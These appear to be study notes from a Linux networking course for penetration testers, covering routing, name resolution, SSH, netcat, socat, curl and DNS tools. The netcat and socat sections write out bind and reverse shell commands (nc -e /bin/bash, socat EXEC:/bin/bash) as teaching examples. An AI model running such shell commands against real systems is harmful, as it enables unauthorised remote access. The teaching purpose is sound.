In this module, we will cover the following topics 🎯:
- Essential Networking Utilities
- Active Connections and Neighbors
- Routing and Network Troubleshooting
- Name Resolution
- Common Clients
- Netcat
- Socat
- HTTP
- DNS
- FTP

Understanding Linux networking is crucial because most security assessments begin on a Kali machine. Additionally, many global servers rely on Linux, making it essential for computer engineers and security professionals to grasp Linux concepts and utilities for effective tool usage.

## Essential Networking Utilities 🔧

The learning objectives for this section are:
1. Determine the IP address of a host.
2. Change the networking configuration of a host.
3. Identify the hostname of a system.

## Active Connections and Neighbors 🌐

The learning objectives for this section are:
1. Identify connections to a local linux host.
2. Understand various network connection states.
3. Identify other hosts on the local network.

This section covers **enumeration** hosts communicating with our system using **netstat, ss, and arp.**

Let's start by entering netstat -natup in the Kali Terminal. We'll set -n to show numerical addresses instead of trying to determine symbolic host, port, or user names. The -a option will show both listening and non-listening sockets. Setting the -t option lists TCP connections. We'll use -u to list UDP connections as well. Finally, let's set -p to show the PID and name of the program to which each socket belongs.

A symbolic host is a human-readable hostname, explained further in the Name Resolution unit. However, netstat is now a legacy command, replaced by ss, which will be introduced next.

```bash
kali@kali:~$ netstat -natup
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -  
```

## Routing and Network Troubleshooting (route, traceroute, ping)

### **Learning Objectives**  
This learning unit covers the following objectives:  
- Identify the routes a local Linux host has access to.  
- Add a route into a Linux host routing table.  
- Determine the network path from a Linux host to a remote host.  

This unit will take approximately **90 minutes** to complete.  

### **Understanding Routing and Network Troubleshooting**  
Understanding where network traffic is going is crucial in determining what can and cannot be accessed. As covered in the **Networking Module**, routes are determined by routers in the network.  

Although routers direct network traffic, a **host** must be configured to use a router as a **gateway** to reach other networks. We can retrieve a list of routes using the `route` command:  

```bash
kali@kali:~$ route
Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
default         10.0.2.2        0.0.0.0         UG    0      0        0 eth0
10.0.2.0        0.0.0.0         255.255.255.0   U     0      0        0 eth0
```

#### **Explanation of the Routing Table**  
- The **default route** directs all non-matching traffic to the router at `10.0.2.2`, which is equivalent to `0.0.0.0`.  
- The **Destination** field shows where packets are being sent.  
- The **Genmask** field works with the destination to define the network scope (`255.255.255.0` = `/24`).  
- The **Iface** field shows which interface (`eth0`) is handling the route.  
- The **Flags** field indicates whether the connection is active (`U`) and if it is a gateway (`G`).  

### **Adding a New Network Interface**  
If a host has multiple network interfaces, we can check their configurations using the `ip addr` command:  

```bash
kali@kali:~$ ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 ...
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 ...
    inet 10.0.2.15/24 brd 10.0.2.255 scope global dynamic eth0
3: eth1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 ...
    inet 10.13.37.5/24 brd 10.13.37.255 scope global dynamic eth1
```

Here, `eth1` is an additional interface connected to the network `10.13.37.0/24`.

### **Testing Network Connectivity with Ping**  
To check connectivity with another host (`10.13.37.117`), we use the `ping` command:  

```bash
kali@kali:~$ ping 10.13.37.117
PING 10.13.37.117 (10.13.37.117) 56(84) bytes of data.
^C
--- 10.13.37.117 ping statistics ---
114 packets transmitted, 0 received, 100% packet loss
```

Since the ping failed, we can limit the number of attempts using `-c`:  

```bash
kali@kali:~$ ping -c 5 10.13.37.117
5 packets transmitted, 0 received, 100% packet loss
```

The failure occurs because no specific route exists for `10.13.37.0/24`, so traffic is incorrectly routed.

### **Adding a Route to Fix Connectivity**  
To manually add a route, we use the following command:  

```bash
kali@kali:~$ sudo ip route add 10.13.37.0/24 dev eth1
```

Now, checking the routing table again:  

```bash
kali@kali:~$ route
Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
default         10.0.2.2        0.0.0.0         UG    0      0        0 eth0
10.0.2.0        0.0.0.0         255.255.255.0   U     0      0        0 eth0
10.13.37.0      0.0.0.0         255.255.255.0   U     0      0        0 eth1
```

With this route added, we retry pinging `10.13.37.117` with 3 attempts:  

```bash
kali@kali:~$ ping -c 3 10.13.37.117
64 bytes from 10.13.37.117: icmp_seq=1 ttl=64 time=0.440 ms
64 bytes from 10.13.37.117: icmp_seq=2 ttl=64 time=0.519 ms
64 bytes from 10.13.37.117: icmp_seq=3 ttl=64 time=0.633 ms
```

Now, the pings are **successful** after adding the route.

### **Using Traceroute for Network Path Analysis**  
`traceroute` helps analyze the network path between a source and destination:  

```bash
kali@kali:~$ traceroute offsec.com
traceroute to offsec.com (192.124.249.5), 30 hops max, 60 byte packets
 1  10.0.2.2 (10.0.2.2)  0.499 ms  0.471 ms  0.693 ms
 2  192.168.1.1 (192.168.1.1)  2.778 ms  3.851 ms  4.923 ms
 3  72.31.137.17.res.spectrum.com (72.31.137.17)  16.763 ms ...
 ...
11  et-0-0-17.cr8-mia1.ip4.gtt.net (213.200.113.150)  31.964 ms ...
12  * * *
...
30  * * *
```

#### **Understanding the Output**  
- Each **number** represents a hop (router) that forwards the packet.  
- Some routers display IP addresses, while others resolve to **human-readable** names.  
- The asterisks (`* * *`) indicate unreachable or unresponsive routers.  

We can modify the maximum number of hops using `-m`, e.g.,:  

```bash
traceroute -m 75 offsec.com
```
---

## **Name Resolution Overview**

Name resolution is the process of converting a human-readable domain name (like `kali.org`) into an IP address (like `35.185.44.232`). It's much easier to remember `kali.org` than to remember an IP address. However, sometimes the name resolution process on a network might break, forcing us to use the IP address instead of the name.

This section covers key components on Linux for configuring name resolution, whether it's to reach a server or handled locally on the machine. We can use the **ping** utility to find the associated IP address.

### **Learning Objectives**

- **Determine the IP associated with a human-readable domain name.**
- **Understand the construction of the `/etc/resolv.conf` configuration file.**
- **Add entries to the `/etc/hosts` configuration file to resolve domain names to IPs on a Linux host.**


### **How Name Resolution Works**

Name resolution is the process of converting domain names into IP addresses so the system can connect to network services. For example, instead of remembering an IP address like `35.185.44.232`, users can remember `kali.org`, which is much easier.

When you type a domain name like `kali.org` into your browser, the system queries a **DNS server** to find the corresponding IP address. This process is similar to searching for a phone number in a physical phone book.

### **Important Configuration Files for Name Resolution on Linux**

1. **/etc/resolv.conf**
   
   This file contains DNS configurations. The three main entries in the file are:
   - **domain**: The root domain.
   - **search**: The search domain, which is appended to queries that don't specify a domain.
   - **nameserver**: The DNS server IP addresses.

   Example `/etc/resolv.conf`:
   ```bash
   domain offsec.com
   search offsec.com
   nameserver 192.168.1.1
   ```

2. **/etc/hosts**
   
   The `/etc/hosts` file allows you to manually map domain names to IP addresses, without using a DNS server. This is useful for internal or custom domain name resolution.

   Example `/etc/hosts`:
   ```bash
   127.0.0.1       localhost
   127.0.1.1       kali
   ```

3. **/etc/nsswitch.conf**
   
   The `/etc/nsswitch.conf` file controls the order in which name resolution methods are used. For example, the `hosts` line in this file tells the system to check local files (like `/etc/hosts`) before using DNS.

   Example `/etc/nsswitch.conf`:
   ```bash
   hosts:          files mdns4_minimal [NOTFOUND=return] dns
   ```

---

### **How `/etc/resolv.conf` Works**

- **domain**: Specifies the root domain. If a query is made without a domain, the system will append this domain.
- **search**: Defines additional domains for automatic resolution. If no domain is specified, these domains will be searched.
- **nameserver**: Specifies the DNS servers to use. If the first DNS server fails, the system will try the next one.

You can add multiple `nameserver` entries for fallback DNS servers:
```bash
nameserver 192.168.1.1
nameserver 8.8.8.8
```

### **Using `/etc/hosts` for Name Resolution**

You can add custom domain name entries to the `/etc/hosts` file to resolve names locally.

- To resolve the name `FileShare` to the IP `10.124.17.10`, you would add the following to the `/etc/hosts` file:
  ```bash
  10.124.17.10    FileShare
  ```

Once this entry is added, you can access `FileShare` instead of using the IP address.

Example `/etc/hosts` with added entries:
```bash
127.0.0.1       localhost me
127.0.1.1       kali
10.124.17.10    FileShare
```

Now, `FileShare` resolves to `10.124.17.10`.

### **Understanding `/etc/nsswitch.conf`**

The `/etc/nsswitch.conf` file determines the order in which name resolution methods are used. For instance, the `hosts` line specifies that the system will check local files (`/etc/hosts`) first, then multicast DNS (`mdns4_minimal`), and finally DNS.

Example `/etc/nsswitch.conf`:
```bash
hosts: files mdns4_minimal [NOTFOUND=return] dns
```

This means the system will:
1. First check `/etc/hosts` for name resolution.
2. If not found, it will try mDNS (for `.local` domains).
3. Finally, it will query DNS.

---
## SSH, SCP, and SSHPASS
This Learning Unit covers the following Learning Objectives:

1. Start a local SSH server
2. Gain access to remote hosts with the SSH utility
3. Customize SSH server configurations on a Linux host
4. Understand SSH fingerprinting
5. Copy files using the SCP utility
6. Use a password in a single command for SSH with SSHPass
7. Understand the risk of using passwords within command executions

## SSH (Secure Shell Protocol)

SSH is a client/server protocol used to establish secure connections between computers. Unlike telnet, SSH encrypts communications over the network. SSH operates on TCP port 22 by default and requires authentication via username/password or public/private keys.

### Key Components:

1. **Starting an SSH server:**
   ```bash
   sudo systemctl start ssh
   sudo systemctl status ssh
   ```

2. **Basic SSH connection:**
   ```bash
   ssh username@hostname
   ```
   Example: `ssh kali@localhost`

3. **SSH on non-standard ports:**
   ```bash
   ssh username@hostname -p port_number
   ```
   Example: `ssh kali@localhost -p 2222`

4. **Server configuration:**
   - Located at `/etc/ssh/sshd_config`
   - Contains settings for the SSH daemon (server)
   - After changing configuration, restart the service: `sudo systemctl restart ssh`

5. **Client configuration:**
   - Global client configuration: `/etc/ssh/ssh_config`
   - User-specific configuration: `~/.ssh/config`

### SSH Fingerprinting:

When connecting to a host for the first time, SSH prompts to verify the host's authenticity by displaying its fingerprint. This helps prevent man-in-the-middle attacks.

- The `.ssh/known_hosts` file stores the fingerprints of trusted hosts
- Options when prompted:
  - `yes`: Saves the fingerprint and connects
  - `fingerprint`: Manually verify by typing the fingerprint
  - `no`: Cancels the connection

- The known_hosts file can be hashed for security (controlled by `HashKnownHosts` in ssh_config)

### User SSH Configuration:

Creating a `~/.ssh/config` file allows setting up aliases for SSH connections:

```
Host lab
    HostName 192.168.55.61
    User offensive
    Port 2222
```

This allows you to simply type `ssh lab` instead of the full command.

## SCP (Secure Copy Protocol)

SCP is used to securely copy files between hosts using SSH:

```bash
scp username@hostname:/path/to/source/file /path/to/destination
```

Example: `scp offensive@192.168.55.61:/home/offensive/.bashrc Copiedbashrc`

## SSHPASS

SSHPASS allows providing SSH passwords in command execution:

```bash
sshpass -p 'password' ssh username@hostname
```

### Security Concerns with SSHPASS:

1. **Command History**: The password appears in plain text in command history
2. **Scripts**: Storing the command in scripts exposes the password

In production environments, it's better to use SSH key-based authentication instead of password authentication, especially for automated tasks.

---
## nc (Netcat)
Here’s your explanation of **Netcat (nc)** in English using **Markdown format**:  

---

## **Netcat (nc) - The Swiss Army Knife of Networking**  

### **Learning Objectives**  
This learning unit covers the following objectives:  

- Connect to a **TCP/UDP** port using Netcat  
- Listen on a **TCP/UDP** port with Netcat  
- Transfer files with Netcat  
- Gain **remote access** to a host using Netcat  
- Execute a **Netcat bind shell**  
- Execute a **Netcat reverse shell**  

### **1. Introduction to Netcat**  

Netcat (`nc`), first released in **1995** by *Hobbit*, is one of the earliest **network penetration testing** tools. It is often referred to as a **"Swiss Army Knife"** for network testing because of its **versatility**.  

🔹 **Netcat’s primary function:** "A utility that reads and writes data across network connections using TCP or UDP protocols."  

🔹 **Modes of operation:** Netcat can operate in either **client** or **server** mode.  

### **2. Connecting to a TCP/UDP Port (Client Mode)**  

Using Netcat in **client mode** allows us to:  

- Check if a **port is open or closed**  
- Read a **service banner** from an open port  
- Manually interact with **network services**  

#### **Example: Checking if an SSH Port (22) is Open**  

```bash
kali@kali:~$ nc -nv 192.168.55.61 22
(UNKNOWN) [192.168.55.61] 22 (ssh) open
SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.4
```

✅ Netcat successfully connected to **port 22**, showing the **SSH service banner**.  

#### **Example: Checking a Closed Port (25565)**  

```bash
kali@kali:~$ nc -nv 192.168.55.61 25565
(UNKNOWN) [192.168.55.61] 25565 (?) : Connection refused
```

❌ **Connection refused** → The port is **closed**.  

#### **Example: Connecting to a Web Server (Port 80) & Sending a GET Request**  

```bash
kali@kali:~$ nc -nv 192.168.65.61 80
(UNKNOWN) [192.168.65.61] 80 (http) open
GET / HTTP/1.1
Host: 192.168.65.61
```

✅ Netcat received a **200 OK** response, confirming the web server is active.  


### **3. Listening on a TCP/UDP Port (Server Mode)**  

Netcat can also act as a **server** to receive incoming connections.  

#### **Example: Creating a Basic Chat Service**  

1️⃣ **Start a listener on Kali (port 6666):**  

```bash
kali@kali:~$ nc -lvnp 6666
listening on [any] 6666 ...
```

2️⃣ **Connect from the target system:**  

```bash
offensive@server01:~$ nc -nv 192.168.65.200 6666
Connection to 192.168.65.200 6666 port [tcp/*] succeeded!
This is a chat message from the exercise host!
```

3️⃣ **Message received on Kali’s terminal:**  

```bash
kali@kali:~$ nc -lvnp 6666
listening on [any] 6666 ...
connect to [192.168.65.200] from (UNKNOWN) [192.168.65.61] 38786
This is a chat message from the exercise host!
```

✅ **Successful communication established!**  

---

### **4. Transferring Files with Netcat**  

Netcat can also be used to transfer files **between machines**.  

#### **Example: Sending a File from Kali to the Exercise Host**  

1️⃣ **Set up a listener on the target machine:**  

```bash
offensive@server01:~$ nc -lvnp 6666 > incoming.txt
Listening on 0.0.0.0 6666
```

2️⃣ **Create and send a file from Kali:**  

```bash
kali@kali:~$ echo "This is an example of sending a file" > incoming.txt
kali@kali:~$ nc -nv 192.168.65.61 6666 < incoming.txt
```

3️⃣ **Verify the file transfer:**  

```bash
offensive@server01:~$ cat incoming.txt
This is an example of sending a file
```

✅ **File transfer was successful!**  

---

### **5. Netcat Bind Shell & Reverse Shell**  

🔹 **Netcat's `-e` option** allows remote command execution, making it useful for penetration testing but also a **security risk**.  

---

#### **5.1 Bind Shell (Windows)**  

1️⃣ **Start a bind shell on a Windows machine (Bob's PC):**  

```bash
C:\Users\offsec> nc -nlvp 4444 -e cmd.exe
```

2️⃣ **Connect from a Kali machine (Alice's PC):**  

```bash
kali@kali:~$ nc -nv 10.11.0.22 4444
```

✅ **Alice gains remote access to Bob's Windows command shell.**  

---

#### **5.2 Reverse Shell (Linux)**  

1️⃣ **Set up a listener on Bob's machine (Windows):**  

```bash
C:\Users\offsec> nc -nlvp 4444
```

2️⃣ **Send a reverse shell from Alice’s Kali machine:**  

```bash
kali@kali:~$ nc -nv 10.11.0.22 4444 -e /bin/bash
```

✅ **Bob now has remote shell access to Alice’s Linux machine!**  


### **6. Understanding Bind Shell vs. Reverse Shell**  

| Feature         | Bind Shell | Reverse Shell |
|----------------|-----------|--------------|
| **Who initiates the connection?** | Attacker connects to target | Target connects to attacker |
| **Firewall bypass?** | ❌ Difficult (firewall may block inbound traffic) | ✅ Easier (firewall allows outbound traffic) |
| **Best used when?** | Attacker has direct access to the target's IP | Target is behind NAT or firewall |

---

## Socat

### Learning Objectives:

- Compare netcat and socat
- Transfer files with socat
- Execute a socat reverse shell

### Introduction to Socat

Socat is a command-line utility that establishes two bidirectional byte streams and transfers data between them. It is similar to Netcat but offers additional features beneficial for penetration testing.

### Comparing Socat and Netcat

#### Connecting as a Client:

- **Netcat:** `nc <remote server's IP address> 80`
- **Socat:** `socat - TCP4:<remote server's IP address>:80`

Socat requires `-` to transfer data between STDIO and the remote host while also specifying the protocol (TCP4).

#### Creating a Listener:

- **Netcat:** `sudo nc -lvp localhost 443`
- **Socat:** `sudo socat TCP4-LISTEN:443 STDOUT`

For Socat, the `TCP4-LISTEN` argument specifies the listener protocol, and `STDOUT` redirects output.

### File Transfer with Socat

#### Sending a File:

Alice shares `secret_passwords.txt` on port 443:

```sh
sudo socat TCP4-LISTEN:443,fork file:secret_passwords.txt
```

#### Receiving a File:

Bob downloads the file:

```sh
socat TCP4:10.11.0.4:443 file:received_secret_passwords.txt,create
```

Bob can then check the contents using:

```sh
type received_secret_passwords.txt
```

### Reverse Shell with Socat

#### Bob Starts a Listener:

```sh
socat -d -d TCP4-LISTEN:443 STDOUT
```

#### Alice Sends a Reverse Shell:

```sh
socat TCP4:10.11.0.22:443 EXEC:/bin/bash
```

Upon connection, Bob can execute commands on Alice’s machine.


## HTTP (wget and curl)

## Learning Objectives:

- Download files with wget
- Copy websites with wget
- Download files with curl
- Use a proxy with curl

### Downloading Files with wget

#### Basic Usage:

```sh
wget https://www.offsec.com/documentation/penetration-testing-with-kali.pdf
```

#### Renaming the Downloaded File:

```sh
wget https://www.offsec.com/documentation/penetration-testing-with-kali.pdf -O PEN-200-Syllabus.pdf
```

#### Saving wget Logs:

```sh
wget https://www.offsec.com/documentation/penetration-testing-with-kali.pdf -o log
```

### Copying an Entire Website with wget

Use the `--recursive` option:

```sh
wget --recursive https://www.kali.org/
```

After completion, the downloaded site structure can be examined:

```sh
ls www.kali.org
```

### Downloading Files with curl

#### Basic Usage:

```sh
curl https://www.offsec.com/documentation/penetration-testing-with-kali.pdf
```

#### Saving Output to a File:

```sh
curl https://www.offsec.com/documentation/penetration-testing-with-kali.pdf -o PEN-200-Syllabus.pdf
```

#### Using curl with a Proxy:

```sh
curl -x http://proxyserver:port https://example.com
```

Both `wget` and `curl` are powerful tools for downloading content and performing security analysis.

---
## DNS (Domain Name System)

### **Summary of DNS (host, dig, nslookup) Learning Unit**

#### **Learning Objectives**
- Understand different types of DNS records.
- Use the **host** command to retrieve hostname information.
- Use the **dig** command to query DNS details.
- Use the **nslookup** command for DNS lookups.

#### **Overview of DNS**
DNS (Domain Name System) is a **distributed database** that translates domain names into IP addresses, playing a crucial role in internet functionality. Understanding DNS is essential for troubleshooting network issues.

DNS operates in a **hierarchical structure**, starting from the root zone. The resolution process follows these steps:
1. A hostname (e.g., `www.megacorpone.com`) is entered into a browser.
2. The DNS client on the operating system forwards the request to a configured DNS server.
3. The **DNS recursor** (first DNS server) interacts with the DNS infrastructure.
4. It queries a **root server**, which directs it to the **Top-Level Domain (TLD) server** (e.g., `.com`).
5. The TLD server provides the address of the **authoritative nameserver** for the domain.
6. The authoritative nameserver contains the **zone file**, where:
   - **Forward lookup zones** map domain names to IP addresses.
   - **Reverse lookup zones** (if configured) map IP addresses to domain names.
7. The DNS client receives the IP address and establishes a connection to the server.

#### **DNS Caching**
To optimize performance, DNS records are **cached** at different levels:
- Web browsers have their own DNS cache.
- Operating systems maintain a local DNS cache.
- DNS servers store previously queried records.
- The **Time To Live (TTL)** field controls how long a record is cached.

#### **Common DNS Record Types**
- **NS** (Nameserver): Lists authoritative DNS servers for a domain.
- **A** (Address): Maps a hostname to an IPv4 address.
- **MX** (Mail Exchange): Specifies mail servers handling emails for the domain.
- **PTR** (Pointer): Used in reverse lookups to find domain names from IP addresses.
- **CNAME** (Canonical Name): Creates an alias for another hostname.
- **TXT** (Text): Stores arbitrary text data, often for verification purposes.

DNS records can be used for **information gathering**, making DNS a target for reconnaissance.


### **Using Command-Line Tools for DNS Queries**
#### **1. `host` Command**
The `host` command retrieves DNS records:
```bash
kali@kali:~$ host www.megacorpone.com
www.megacorpone.com has address 38.100.193.76
```
It defaults to **A records**, but other types can be queried:
```bash
kali@kali:~$ host -t mx megacorpone.com
megacorpone.com mail is handled by 10 fb.mail.gandi.net.
```
```bash
kali@kali:~$ host -t txt megacorpone.com
megacorpone.com descriptive text "Try Harder"
```

#### **2. `nslookup` Command**
`nslookup` finds IP addresses of domains:
```bash
kali@kali:~$ nslookup kali.org
Name: kali.org
Address: 35.185.44.232
```
It provides a **non-authoritative answer**, meaning it relies on a cache or recursive lookup.

#### **3. `dig` Command**
`dig` offers **detailed DNS query results**, including query time and authoritative responses:
```bash
kali@kali:~$ dig kali.org
...
;; ANSWER SECTION:
kali.org.  300  IN  A  35.185.44.232
```
Querying **MX records**:
```bash
kali@kali:~$ dig -t mx kali.org
...
kali.org.  1800  IN  MX  10 alt1.aspmx.l.google.com.
```
Querying a **specific DNS server (Google’s 8.8.8.8)**:
```bash
kali@kali:~$ dig @8.8.8.8 kali.org
```
---



